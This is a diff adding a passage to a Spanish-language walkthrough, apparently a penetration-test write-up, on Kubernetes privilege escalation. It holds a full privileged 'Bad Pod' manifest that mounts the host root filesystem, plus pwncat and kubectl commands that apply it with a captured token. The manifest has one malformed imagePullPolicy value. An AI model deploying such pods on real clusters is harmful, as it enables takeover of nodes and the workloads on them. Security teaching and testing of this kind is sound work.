@@ -167,6 +167,58 @@ grafana-123445566-xxxx    1/1      Running       2      24d
 ...
 ```
 
+Ahora ya es posible que podamos iniciar un pod en el cluster. Uno que puede ser interesante es 'Bishop Fox' que se encuentra en una colección de Bad Pods para permitir escalado de privilegios (https://bishopfox.com/blog/kubernetes-pod-privilege-escalation).
+
+Elegimos uno de ellos que nos permita acceso a todos los elementos del cluster. Lo más importante de esta especificación es la parte en la que monta el volumen en '/host':
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-exec-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: ubuntu
+    imagePullPolicy: IfNot>Present # añadir para que se descargue
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
+Subimos este archivo al pod para poder aplicarlos.
+
+```console
+
+pwncat$ upload ./privscal.yaml
+
+
+$ ./kubectl apply -f privscal.yaml --token=$TOKEN
+pod created
+```
+Sin embargo, el pod no se está ejecutando porque no se puede descargar la imagen puesto que no se tiene acceso a internet para acceder al registro. 
+```console
+$ ./kubectl describe pod everything-allowed-exec-pod  --token=$TOKEN
+...
+Failed to pull image "ubuntu" ...
+...
+```
+
+
+
 
 
 
